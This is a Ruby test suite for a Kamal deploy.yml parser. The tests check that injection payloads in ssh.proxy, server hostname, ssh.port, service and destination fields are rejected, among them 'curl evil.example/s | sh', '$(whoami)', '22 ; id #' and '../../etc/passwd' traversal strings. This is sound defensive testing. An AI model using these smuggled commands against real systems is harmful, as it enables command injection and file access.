require "test_helper"

class Kamal::ConfigParserTest < ActiveSupport::TestCase
  # Two fake subprocesses used only by tests, to verify just these two things in
  # run_subprocess: "writing stdin is also covered by the hard timeout" and "a child
  # exiting early doesn't become an uncaught Errno::EPIPE", without depending on real
  # Kamal parsing behavior:
  #   - NeverReadsStdin: deliberately never reads stdin, to verify the parent's
  #     stdin.write doesn't hang the whole parent process.
  #   - ExitsImmediately: deliberately exits at once without reading stdin at all, to
  #     verify that when the parent's stdin.write hits an already-closed pipe, it just gets
  #     an Errno::EPIPE that is quietly swallowed rather than raised as an exception the
  #     caller sees.
  class NeverReadsStdin < Kamal::ConfigParser
    private
      def command
        [ RbConfig.ruby, "-e", "sleep 100" ]
      end
  end

  class ExitsImmediately < Kamal::ConfigParser
    private
      def command
        [ RbConfig.ruby, "-e", "exit 0" ]
      end
  end

  def simple_yaml
    file_fixture("simple_deploy.yml").read
  end

  test "parses the service name, roles and hosts" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")

    assert_equal "blog", parsed.service
    assert_equal "production", parsed.destination
    assert_equal %w[web worker], parsed.roles.map { |r| r[:name] }.sort
    assert_equal [ "127.0.0.1" ], parsed.app_hosts
    assert_equal "registry.example.com", parsed.registry_server
  end

  test "container name prefix includes the destination, matching Kamal's convention" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")
    web = parsed.roles.detect { |r| r[:name] == "web" }

    assert_equal "blog-web-production", web[:container_prefix]
  end

  test "reuses the SSH options declared in deploy.yml" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")

    assert_equal "deploy", parsed.ssh_options[:user]
    assert_equal 2201, parsed.ssh_options[:port]
  end

  test "invalid YAML raises ParseError instead of crashing" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: "这不是合法的 deploy 配置")
    end

    assert_match(/./, error.message)
  end

  test "parsing runs in a subprocess: ERB in deploy.yml cannot pollute the panel process" do
    malicious = <<~YAML
      service: evil
      image: example/evil
      <%= Object.const_set(:PANEL_WAS_COMPROMISED, true) %>
      servers:
        web:
          - 127.0.0.1
    YAML

    # Whether parsing succeeds doesn't matter; what matters is that the constant does not appear in
    # this process
    begin
      Kamal::ConfigParser.call(yaml: malicious)
    rescue Kamal::ConfigParser::ParseError
      # allowed
    end

    refute defined?(::PANEL_WAS_COMPROMISED),
      "ERB was evaluated inside the panel process -- parsing is not truly isolated in the subprocess"
  end

  test "a parse timeout is treated as a failure" do
    slow = <<~YAML
      service: slow
      image: example/slow
      <%= sleep 30 %>
      servers:
        web:
          - 127.0.0.1
    YAML

    assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: slow, timeout: 2)
    end
  end

  test "a parse timeout leaves no temp files on disk (including the user payload)" do
    slow = <<~YAML
      service: slow
      image: example/slow
      <%= sleep 30 %>
      servers:
        web:
          - 127.0.0.1
    YAML

    pattern = File.join(Dir.tmpdir, "#{Kamal::ConfigParser::TMPDIR_PREFIX}*")

    assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: slow, timeout: 1)
    end

    assert_empty Dir.glob(pattern),
      "the temp directory was not cleaned up after the timeout -- the user's pasted deploy.yml may still be on disk"
  end

  # destination currently has no length limit, and inflating it inflates the JSON payload
  # passed to the subprocess -- reproducing the magnitude reported in the round 3 review
  # (16 KiB growing to 98,316 bytes, far above the common 64KiB pipe buffer). Tested
  # directly via run_subprocess (skipping write_config_files): once destination is this
  # long, in the normal flow destination_path treats it as part of a filename to write to
  # disk and hits the filesystem filename length limit (ENAMETOOLONG) head-on -- that is
  # another pre-existing problem, unrelated to what's tested here ("is writing stdin
  # covered by the hard timeout"), so we don't go through the public #call full flow.
  def huge_destination
    "x" * (256 * 1024)
  end

  test "the parent's stdin write is under the hard timeout too: a child that never reads stdin cannot block it" do
    parser = NeverReadsStdin.new(yaml: simple_yaml, destination: huge_destination, destination_yaml: nil, timeout: 0.5)

    t0 = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    Dir.mktmpdir do |dir|
      assert_raises(Kamal::ConfigParser::ParseError) { parser.send(:run_subprocess, dir) }
    end
    elapsed = Process.clock_gettime(Process::CLOCK_MONOTONIC) - t0

    # Before this fix, what was measured here was 117.85 seconds (the parent really got stuck on
    # stdin.write and the hard timeout never took effect). Now it should land near the timeout.
    assert_operator elapsed, :<, 5.0, "stdin.write should be covered by the hard timeout like other IO and must not block the parent"
  end

  test "a child exiting early without reading stdin does not make the parent's write raise Errno::EPIPE" do
    parser = ExitsImmediately.new(yaml: simple_yaml, destination: huge_destination, destination_yaml: nil, timeout: 3.0)

    # The expected failure mode is ParseError ("subprocess produced no output") -- not
    # Errno::EPIPE. assert_raises only recognizes the exact class it names; if
    # Errno::EPIPE really leaks out here, assert_raises fails with "expected ParseError,
    # got Errno::EPIPE" instead of passing silently.
    Dir.mktmpdir do |dir|
      assert_raises(Kamal::ConfigParser::ParseError) { parser.send(:run_subprocess, dir) }
    end
  end

  test "child output exceeding the pipe buffer is not misreported as a timeout" do
    many_hosts = (1..5_000).map { |i| "10.#{(i >> 16) & 0xFF}.#{(i >> 8) & 0xFF}.#{i & 0xFF}" }
    large_yaml = YAML.dump(
      "service" => "big",
      "image" => "example/big",
      "servers" => { "web" => many_hosts },
      "registry" => { "server" => "registry.example.com", "username" => "someone", "password" => [ "KAMAL_REGISTRY_PASSWORD" ] },
      "builder" => { "arch" => "amd64" }
    )

    # Explicitly give a generous timeout. What this assertion targets is "output that
    # overflows the pipe buffer isn't misreported as a timeout", unrelated to the 5 second
    # DEFAULT_TIMEOUT budget -- parsing 5000 hosts locally takes 3.9 seconds, leaving only
    # 1.1 seconds of margin, and when a CI runner is slow it really does time out, so a
    # correct behavior got rendered as red (both CI runs tripped on this one).
    parsed = Kamal::ConfigParser.call(yaml: large_yaml, timeout: 60.seconds)

    assert_equal many_hosts.sort, parsed.app_hosts.sort
  end

  test "destination_yaml overrides servers in the base (the main purpose of a destination)" do
    base = YAML.dump(
      "service" => "blog",
      "image" => "example/blog",
      "servers" => { "web" => [ "127.0.0.1" ] },
      "registry" => { "server" => "registry.example.com", "username" => "someone", "password" => [ "KAMAL_REGISTRY_PASSWORD" ] },
      "builder" => { "arch" => "amd64" }
    )
    override = YAML.dump("servers" => { "web" => [ "10.0.0.9" ] })

    parsed = Kamal::ConfigParser.call(
      yaml: base,
      destination: "production",
      destination_yaml: override
    )

    assert_equal [ "10.0.0.9" ], parsed.app_hosts
  end

  test "parses with an empty placeholder when destination_yaml is nil, without error" do
    parsed = Kamal::ConfigParser.call(
      yaml: simple_yaml,
      destination: "production",
      destination_yaml: nil
    )

    assert_equal "blog", parsed.service
    assert_equal "production", parsed.destination
  end

  test "no companion file is needed without a destination; parses as usual" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml)

    assert_nil parsed.destination
    assert_equal "blog", parsed.service
  end

  test "an empty-string destination behaves like none and needs no companion file" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "")

    assert_nil parsed.destination
    assert_equal "blog", parsed.service
  end

  # --- The tests below treat destination as an attack surface: it ends up as part of a
  # filename used to build a path (this class builds it once, and Kamal builds it again in the
  # subprocess to locate the companion file), and if path separators/".." were let through, that
  # would be a path traversal surface -- the parent could be induced to write
  # destination_config_yaml to an arbitrary location outside the temp directory, and the subprocess
  # could be induced to read (and ERB-evaluate) any existing .yml on the host. -------

  test "path traversal sequences in destination are rejected (charset check) and nothing is created outside the temp dir" do
    # The target must be derived from this very same traversal payload, not written
    # separately: before, the target assumed here was Rails.root/tmp/..., but the payload
    # actually resolves to /tmp/... -- they are different files, so even if the
    # implementation wrote the file first and only raised afterward, "the assumed target
    # doesn't exist" would pass all the same, and the test would detect nothing.
    #
    # How it's derived: use exactly the same Pathname operations as destination_path
    # (join("deploy.yml").sub_ext(...).expand_path) with any base directory (here "/") --
    # as long as the number of "../" exceeds the depth of any real Dir.mktmpdir temp
    # directory, the result is clamped to the filesystem root, identical to what the
    # implementation computes from the real (unknown, random) temp directory, without
    # depending on guessing its depth.
    suffix = "tmp/PWNED_by_config_parser_test"
    traversal = ("../" * 10) + suffix
    target = Pathname.new("/").join("deploy.yml").sub_ext(".#{traversal}.yml").expand_path

    FileUtils.rm_f(target)

    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(
        yaml: simple_yaml,
        destination: traversal,
        destination_yaml: "servers:\n  web:\n    - 6.6.6.6\n"
      )
    end

    assert_match(/destination 不合法/, error.message)
    refute target.exist?,
      "path traversal sequences in destination should have been rejected, but a file was actually created outside the temp directory (#{target})"
  ensure
    FileUtils.rm_f(target)
  end

  # The test below exercises the second gate on its own (the assertion in destination_path
  # that "the resolved path must still be inside the temp directory"), bypassing the
  # charset check in validate_destination! -- because the charset check already blocks any
  # destination containing "/", the second gate is never reached on the normal call path.
  # The way to bypass is to construct the instance directly and call the private method:
  # this is exactly what "defense in depth" has to prove -- even if the first gate
  # (charset) is later broken or bypassed, the second gate (the path must land inside the
  # temp directory) still works independently.
  test "even with the charset check bypassed, destination_path rejects any path resolving outside the temp dir" do
    parser = Kamal::ConfigParser.new(yaml: simple_yaml, destination: "x", destination_yaml: nil, timeout: 5)
    parser.instance_variable_set(:@destination, "../../../../../../tmp/PWNED_via_destination_path")

    Dir.mktmpdir do |dir|
      error = assert_raises(Kamal::ConfigParser::ParseError) do
        parser.send(:destination_path, dir)
      end

      assert_match(/超出了临时目录范围/, error.message)
    end
  end

  # This tests destination_path itself (not the full #call): a real, existing, perfectly
  # well-formed .yml outside the temp directory (a Kamal config that "overrides host to
  # 6.6.6.6"), even with the charset check bypassed, must be rejected before its contents
  # are read, rather than being opened and read first and only then deciding whether to
  # use it. On the normal call path this external file is never reachable -- it is
  # already rejected at the charset check (validate_destination!) (see the test above);
  # this is not testing "does the full parsing flow leak this file's contents" (the normal
  # flow never gets this far, so there is nothing to leak or test), but separately
  # confirming the behavior of the second gate itself: rejection happens before reading,
  # independent of whether the file exists or its contents are valid.
  test "with the charset check bypassed, destination_path rejects an existing .yml outside the temp dir before reading it" do
    outside = Rails.root.join("tmp", "outside_kamal_panel_test.yml")
    outside.write(YAML.dump("servers" => { "web" => [ "6.6.6.6" ] }))

    parser = Kamal::ConfigParser.new(yaml: simple_yaml, destination: "x", destination_yaml: nil, timeout: 5)
    traversal_to_outside_file = "../" * 10 + outside.expand_path.to_s.delete_prefix("/").sub(/\.yml\z/, "")
    parser.instance_variable_set(:@destination, traversal_to_outside_file)

    Dir.mktmpdir do |dir|
      assert_raises(Kamal::ConfigParser::ParseError) do
        parser.send(:destination_path, dir)
      end
    end
  ensure
    FileUtils.rm_f(outside)
  end

  test "a destination over the length limit is rejected by validation, not by the filesystem filename limit" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: simple_yaml, destination: "x" * 64)
    end

    assert_match(/destination 不合法/, error.message)
    refute_match(/ENAMETOOLONG|File name too long/, error.message)
  end

  test "normal short destinations (hyphens and digits) are unaffected" do
    %w[production staging eu-west prod2].each do |dest|
      parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: dest)

      assert_equal dest, parsed.destination, "destination=#{dest.inspect} should parse as usual"
    end
  end

  test "a non-String destination (from a direct caller bypassing ManagedApp) is rejected as ParseError, not NoMethodError" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: simple_yaml, destination: 42)
    end

    assert_match(/destination 不合法/, error.message)
  end

  # --- service charset validation (Critical 2, task-5 review) -----------------
  #
  # destination's charset was tightened long ago for the reason that it "gets spliced in
  # as a path segment" (see the comments on DESTINATION_FORMAT / validate_destination!
  # above), but service is the same kind of value (likewise from an untrusted deploy.yml,
  # likewise spliced by KamalLock into the lock directory name
  # "lock-#{service}-#{destination}") and never got the same validation.
  #
  # Kamal itself has a charset check on service too (configuration.rb:364,
  # `raw_config[:service] =~ /^[a-z0-9_-]+$/i`), but it uses [line anchors] (^/$) rather
  # than [string anchors] (\A/\z) -- as long as any one whole line in the string matches,
  # `=~` passes it, without requiring the whole string to match. The third test below
  # ("Kamal's own check can be bypassed with a newline") proves this: the service
  # "ok\n../../etc/passwd" is let through by Kamal's own check (the first line "ok"
  # matches on its own), and if the panel relied only on Kamal's gate, "../../etc/passwd"
  # would be handed as part of service, verbatim, to KamalLock to build the lock directory
  # path. validate_service! (\A...\z, string anchors) added in this class blocks that
  # bypass -- this is not duplicated work but defense in depth: if either layer fails on
  # its own, the other is still there. The first two tests lock in that the "plainest
  # attack surface" is still rejected at the parsing stage (whether blocked by Kamal
  # itself or by this class, the end result must be a ParseError; a service containing
  # path separators must never parse successfully).

  def yaml_with_service(service_yaml_scalar)
    <<~YAML
      service: #{service_yaml_scalar}
      image: example/blog
      servers:
        web:
          - 127.0.0.1
      registry:
        server: registry.example.com
        username: someone
        password:
          - KAMAL_REGISTRY_PASSWORD
      builder:
        arch: amd64
    YAML
  end

  test "a service containing a path separator is rejected" do
    assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_service("a/b"))
    end
  end

  test "a service containing a path traversal sequence is rejected" do
    assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_service("../../etc/passwd"))
    end
  end

  test "Kamal's own validation can be bypassed with a newline, but this class's validate_service! blocks it" do
    # "\n" inside a double-quoted YAML scalar is a real newline (not a literal backslash n).
    # Kamal's /^[a-z0-9_-]+$/i only requires one whole line to match -- the first line "ok"
    # alone satisfies it -- so Kamal's own check lets the whole string through, carrying
    # "../../etc/passwd" along with it.
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_service('"ok\n../../etc/passwd"'))
    end

    assert_match(/service 不合法/, error.message,
      "this class's own validation (string anchors \\A...\\z) should reject this newline injection, " \
      "rather than letting Kamal's weaker validation (line anchors ^...$) let it through")
  end

  test "normal service names are unaffected" do
    %w[blog my-app web2 some_service].each do |name|
      parsed = Kamal::ConfigParser.call(yaml: yaml_with_service(name))

      assert_equal name, parsed.service, "service=#{name.inspect} should parse as usual"
    end
  end

  # --- ssh.proxy / ssh.proxy_command attack surface ---------------------------
  #
  # Reproduce and lock down the problem reported in the round 4 review:
  # bin/parse_deploy_config used to hand over config.ssh.proxy&.to_s --
  # Net::SSH::Proxy::Jump defines no meaningful #to_s, so after crossing the JSON boundary
  # it became the literal string "#<Net::SSH::Proxy::Jump:0x...>", which
  # Collectors::SshSession then passed to Net::SSH.start verbatim, blowing up with a
  # NoMethodError ("private method 'open' called for an instance of String") at real
  # connection time -- capture_many used to quietly swallow this NoMethodError as "host
  # unreachable". Now build_ssh_options/build_proxy construct the object from the raw
  # string in the parent process; what we lock in here: normal input builds a usable
  # object, and malicious input is rejected at the parsing stage rather than blowing up in
  # some odd way only when the connection is actually established.

  def yaml_with_ssh(ssh_extra)
    YAML.dump(
      "service" => "blog",
      "image" => "example/blog",
      "servers" => { "web" => [ "127.0.0.1" ] },
      "registry" => { "server" => "registry.example.com", "username" => "someone", "password" => [ "KAMAL_REGISTRY_PASSWORD" ] },
      "builder" => { "arch" => "amd64" },
      "ssh" => { "user" => "deploy", "port" => 2201 }.merge(ssh_extra)
    )
  end

  test "a valid ssh.proxy (user@host) is built into a usable Net::SSH::Proxy::Jump" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "user@bastion"), destination: "production")

    proxy = parsed.ssh_options[:proxy]

    assert_instance_of Net::SSH::Proxy::Jump, proxy
    assert_equal "user@bastion", proxy.jump_proxies
  end

  test "a valid ssh.proxy (user@host:port) keeps the port as-is in the jump spec" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "user@bastion:2222"), destination: "production")

    assert_equal "user@bastion:2222", parsed.ssh_options[:proxy].jump_proxies
  end

  test "a bare-hostname ssh.proxy defaults the user to root, matching Kamal::Configuration::Ssh#proxy" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "bastion"), destination: "production")

    assert_equal "root@bastion", parsed.ssh_options[:proxy].jump_proxies
  end

  test "ssh_options[:proxy] is nil without ssh.proxy and no proxy object is conjured up" do
    parsed = Kamal::ConfigParser.call(yaml: simple_yaml, destination: "production")

    assert_nil parsed.ssh_options[:proxy]
  end

  test "an ssh.proxy containing a comma (multi-hop/command injection point in Net::SSH::Proxy::Jump) is rejected" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(
        yaml: yaml_with_ssh("proxy" => "user@bastion,x; curl evil.example/s | sh"),
        destination: "production"
      )
    end

    assert_match(/逗号/, error.message)
  end

  test "ssh.proxy with shell special characters (semicolon, pipe, substitution, backtick, whitespace) is rejected" do
    [
      "user@bastion; curl evil.example/s | sh",
      "user@bastion|sh",
      "user@$(whoami)",
      "user@bastion`whoami`",
      "user@bastion extra",
      "user name@bastion"
    ].each do |bad_proxy|
      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bad_proxy.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => bad_proxy), destination: "production")
      end

      assert_match(/ssh\.proxy 不合法/, error.message, "rejecting #{bad_proxy.inspect} should give an ssh.proxy format error, not some other error")
    end
  end

  # round 5 review: round 4 tightened the ssh.proxy host charset to exclude underscores,
  # but Kamal's own proxy rule (Kamal::Configuration::Ssh#proxy) has no such restriction --
  # hostnames like "bastion_1" used to work and stopped working after round 4, which is
  # a regression that should not exist.
  test "an ssh.proxy hostname with an underscore (e.g. 'bastion_1') is no longer rejected -- round 4 wrongly did" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "user_1@bastion_2:2222"), destination: "production")

    assert_equal "user_1@bastion_2:2222", parsed.ssh_options[:proxy].jump_proxies
  end

  test "an ssh.proxy user part with a leading hyphen is rejected (argument injection, same rule as host)" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => "-F@bastion"), destination: "production")
    end

    assert_match(/ssh\.proxy 不合法/, error.message)
  end

  # round 5 review explicitly asked: not only to assert "rejected by ConfigParser", but
  # also to feed the values that pass validation to Net::SSH::Proxy::Jump's real
  # implementation (build_proxy_command_equivalent), confirming that the command line
  # produced after allowing underscores is still clean -- free of any shell
  # metacharacters. Here we only call build_proxy_command_equivalent (not #open), so no
  # subprocess is actually run and no connection is made; it purely checks "what command
  # line this class would assemble from validated input".
  test "re-checks the ssh.proxy charset (incl. the underscore allowed in round 5): the built command line has no shell metacharacters" do
    accepted_proxies = [
      "user@bastion",
      "bastion",
      "user@bastion:2222",
      "bastion_1",
      "user_1@bastion_2:2222"
    ]

    # Don't check plain spaces -- the command-line template itself uses spaces to separate
    # arguments like "-l user -p 22", which is the normal shape of this command line, not
    # injection. What really must be blocked are semicolons, pipes, backticks, `$( )`,
    # quotes, backslashes, and control characters (tab/newline/NUL).
    shell_metacharacters = /[;&|`$(){}<>'"\\\t\n\r\x00]/

    accepted_proxies.each do |proxy_spec|
      parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("proxy" => proxy_spec), destination: "production")
      proxy = parsed.ssh_options[:proxy]

      assert_instance_of Net::SSH::Proxy::Jump, proxy, "#{proxy_spec.inspect} should be accepted"

      command_line = proxy.build_proxy_command_equivalent(nil)

      refute_match(shell_metacharacters, command_line,
        "the command line built from #{proxy_spec.inspect} should not contain shell metacharacters, got #{command_line.inspect}")
    end
  end

  test "ssh.proxy_command is rejected with a Chinese error pointing to ssh.proxy -- a permanent product decision, not a v1 limit" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(
        yaml: yaml_with_ssh("proxy_command" => "ssh -W %h:%p bastion"),
        destination: "production"
      )
    end

    assert_match(/proxy_command 不受支持/, error.message)
    assert_match(/ssh\.proxy/, error.message, "the error should tell the user to use ssh.proxy instead")
  end

  # --- servers: hostname/IP, ssh.port attack surface --------------------------------
  #
  # The round 4 review pointed out: once the ssh.proxy object is constructed correctly (a
  # direct consequence of the round 1 fix), the line `IO.popen(command_line, "r+")` in
  # Net::SSH::Proxy::Command#open goes from "never reached" to "reached on the first
  # connection" -- and when Net::SSH::Proxy::Jump#build_proxy_command_equivalent builds
  # the command-line template, `%h`/`%p` come from the servers: hostname and ssh.port
  # respectively, and these two fields had no charset validation at all before this class
  # changed (Kamal itself only checks that servers values are String/Hash, not their
  # content; ssh.port is just `fetch("port", 22)`, and the string "22 ; id #" passes
  # through verbatim). What's locked in here: the two attack payloads verified to
  # actually work are rejected, plus a whole batch of attack characters in the same shape
  # as ssh.proxy, and a regression test that "normal values are unaffected".

  def yaml_with_servers(hosts)
    YAML.dump(
      "service" => "blog",
      "image" => "example/blog",
      "servers" => { "web" => hosts },
      "registry" => { "server" => "registry.example.com", "username" => "someone", "password" => [ "KAMAL_REGISTRY_PASSWORD" ] },
      "builder" => { "arch" => "amd64" },
      "ssh" => { "user" => "deploy", "port" => 2201 }
    )
  end

  test "payload verified feasible in review: a servers hostname containing '; touch ... #' is rejected" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_servers([ "1.2.3.4 ; touch /tmp/PWNED_by_config_parser_test #" ]), destination: "production")
    end

    assert_match(/servers 里的主机名\/IP 不合法/, error.message)
  end

  test "payload verified feasible in review: ssh.port '22 ; id #' is rejected" do
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => "22 ; id #"), destination: "production")
    end

    assert_match(/ssh\.port 不合法/, error.message)
  end

  # round 5 review: IPv6 moved from "should reject" to "should accept" (see the IPv6 test
  # added below), so "::1" was removed from this batch test -- not a gap in coverage, it
  # should be accepted anyway, and leaving it would only fight the new behavior.
  test "servers hostname/IP with shell special characters, control characters, multiple @, or non-ASCII is rejected" do
    [
      "1.2.3.4; touch /tmp/PWNED",
      "host|sh",
      "host`whoami`",
      "$(whoami)",
      "host name",           # whitespace
      "host\tname",          # tab
      "host\nname",          # newline
      "host\r\nname",        # CRLF
      "host\x00name",        # NUL
      "host%0aname",         # literal "%0a" (percent is not in the charset)
      "user@host@evil",      # multiple @
      "主机名.example.com",  # non-ASCII
      "-oProxyCommand=x"    # leading hyphen: see the comment above HOST_FORMAT, argument injection
    ].each do |bad_host|
      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bad_host.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_servers([ bad_host ]), destination: "production")
      end

      assert_match(/servers 里的主机名\/IP 不合法/, error.message, "rejecting #{bad_host.inspect} should give a host format error, not some other error")
    end
  end

  # round 5 review: underscores were wrongly rejected in round 4 -- Kamal/SSHKit accept
  # hostnames like "bastion_1", and the panel shouldn't be stricter than they are. Add a
  # regression test here that locks this point specifically, written separately from the
  # "normal hostnames" one so it's obvious at a glance that this tests the problem fixed
  # this round, rather than being covered incidentally.
  test "a servers hostname with an underscore (e.g. 'bastion_1') is no longer rejected -- round 4 wrongly did" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_servers([ "bastion_1" ]), destination: "production")

    assert_equal [ "bastion_1" ], parsed.app_hosts
  end

  test "normal servers hostnames/IPs (IPv4, hostnames, hostnames with hyphens and dots) are unaffected" do
    [ "127.0.0.1", "web1", "web-01.prod-eu.example.com" ].each do |good_host|
      parsed = Kamal::ConfigParser.call(yaml: yaml_with_servers([ good_host ]), destination: "production")

      assert_equal [ good_host ], parsed.app_hosts, "#{good_host.inspect} should parse as usual"
    end
  end

  # The core ask of round 5 review: the panel must not be stricter than the tools it
  # observes. SSHKit's host parser recognizes bare IPv6, and the round 4 charset check
  # (letters, digits, dots, hyphens only) would misjudge all of them as "invalid format" --
  # for a pure IPv6 deployment that means it simply can't be onboarded, and the error
  # blames the charset, telling the user their perfectly valid deploy.yml is wrong.
  test "servers hostnames support bare IPv6" do
    [
      "::1",
      "2001:db8::1",
      "fe80::1"
    ].each do |ipv6_host|
      parsed = Kamal::ConfigParser.call(yaml: yaml_with_servers([ ipv6_host ]), destination: "production")

      assert_equal [ ipv6_host ], parsed.app_hosts, "#{ipv6_host.inspect} should be accepted"
    end
  end

  # Following up on Task 6's review conclusion: it's fine for the parser to accept
  # bracketed IPv6, but no downstream code strips the brackets and splits out the port --
  # SshSession#connect hands the bare literal verbatim to Net::SSH.start → Socket.tcp,
  # and neither recognizes the "[::1]" form, so validation passes yet the connection fails
  # bizarrely. Here bracketed IPv6 is pulled back to "not yet supported", reusing the
  # honest host:port / user@host:port error rather than inventing a second wording.
  test "servers hostname: bracketed IPv6 (with/without port) is rejected with a not-yet-supported error" do
    [ "[::1]", "[2001:db8::1]", "[::1]:2222", "[2001:db8::1]:2222" ].each do |bracketed_host|
      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bracketed_host.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_servers([ bracketed_host ]), destination: "production")
      end

      assert_match(/暂不支持/, error.message, "#{bracketed_host.inspect} should get the \"not supported yet\" error")
      assert_match(/servers 里的 #{Regexp.escape(bracketed_host.inspect)}/, error.message)
      refute_match(/格式不合法|字符集/, error.message)
    end
  end

  test "servers hostname: an IPv6 zone id (like '%eth0') is still rejected even though bare IPv6 is allowed" do
    # fe80::1%eth0 is a valid RFC 4007 scoped address that Resolv::IPv6::Regex itself
    # accepts, but "%" happens to be the substitution character of the Net::SSH::Proxy::Jump
    # command-line template itself (%h/%p), so it must be explicitly blocked outside the
    # charset check; we can't count on "valid IPv6 syntax" meaning "safe to flow into this
    # command-line template".
    error = assert_raises(Kamal::ConfigParser::ParseError) do
      Kamal::ConfigParser.call(yaml: yaml_with_servers([ "fe80::1%eth0" ]), destination: "production")
    end

    assert_match(/servers 里的主机名\/IP 不合法/, error.message)
  end

  test "servers hostname: a bracketed IPv6 with an invalid port (out of range/non-numeric) is rejected" do
    [ "[::1]:0", "[::1]:65536", "[::1]:abc" ].each do |bad_host|
      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bad_host.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_servers([ bad_host ]), destination: "production")
      end

      assert_match(/servers 里的主机名\/IP 不合法/, error.message)
    end
  end

  # round 5 review: SSHKit recognizes these three forms (each host overriding user/port
  # individually), and the panel doesn't support them for now, but the reason for
  # rejecting must be honest -- we can't fob off a "this feature isn't built yet"
  # limitation with a "bad charset" error that sounds like "you misconfigured something".
  # What's asserted here is the error message itself (not just any ParseError passing),
  # because what this round truly locks in is whether "the message tells the truth".
  test "user@host / host:port / user@host:port in servers are rejected as not supported, not as invalid format" do
    [
      "deploy@web1",
      "web1:2222",
      "deploy@web1:2222"
    ].each do |unsupported_host|
      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{unsupported_host.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_servers([ unsupported_host ]), destination: "production")
      end

      assert_match(/暂不支持/, error.message, "#{unsupported_host.inspect} should get the \"not supported yet\" error, not an invalid-format error")
      assert_match(/servers 里的 #{Regexp.escape(unsupported_host.inspect)}/, error.message)
      refute_match(/格式不合法|字符集/, error.message, "a supported SSHKit syntax should not be reported as a format error")
    end
  end

  test "ssh.port with shell special characters, non-digits, or out-of-range values is rejected" do
    [
      "22; id",
      "22|id",
      "22`id`",
      "$(id)",
      "22 extra",
      "-22",
      "0",
      "65536",
      "abc",
      "22\n"
    ].each do |bad_port|
      error = assert_raises(Kamal::ConfigParser::ParseError, "should reject #{bad_port.inspect}") do
        Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => bad_port), destination: "production")
      end

      assert_match(/ssh\.port 不合法/, error.message, "rejecting #{bad_port.inspect} should give an ssh.port format error, not some other error")
    end
  end

  test "a normal ssh.port (Integer or digit-only string) is unaffected" do
    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => 2222), destination: "production")
    assert_equal 2222, parsed.ssh_options[:port]

    parsed = Kamal::ConfigParser.call(yaml: yaml_with_ssh("port" => "2222"), destination: "production")
    assert_equal 2222, parsed.ssh_options[:port]
  end

  # The variable name is up to each app's own deploy.yml, not a constant. This test
  # [deliberately] uses a name other than KAMAL_REGISTRY_PASSWORD -- an implementation that
  # hardcodes that constant turns red right here, while testing with the default name
  # would detect nothing.
  test "parses the environment variable name referenced by the registry password" do
    parsed = Kamal::ConfigParser.call(yaml: file_fixture("registry_env_deploy.yml").read)

    assert_equal "MY_OWN_REGISTRY_TOKEN", parsed.registry_password_env
  end

  # deploy.yml already contains a plaintext password: the panel has no place to inject one, and
  # shouldn't pretend it has.
  test "a literal password yields no injectable variable name" do
    parsed = Kamal::ConfigParser.call(yaml: file_fixture("registry_literal_deploy.yml").read)

    assert_nil parsed.registry_password_env
  end

  test "the existing fixture's registry password is in array form; parses the corresponding variable name" do
    parsed = Kamal::ConfigParser.call(yaml: file_fixture("simple_deploy.yml").read)

    assert_equal "registry.example.com", parsed.registry_server,
      "this fixture already has a registry section; use it to confirm parsing is not broken"
    assert_equal "KAMAL_REGISTRY_PASSWORD", parsed.registry_password_env
  end
end
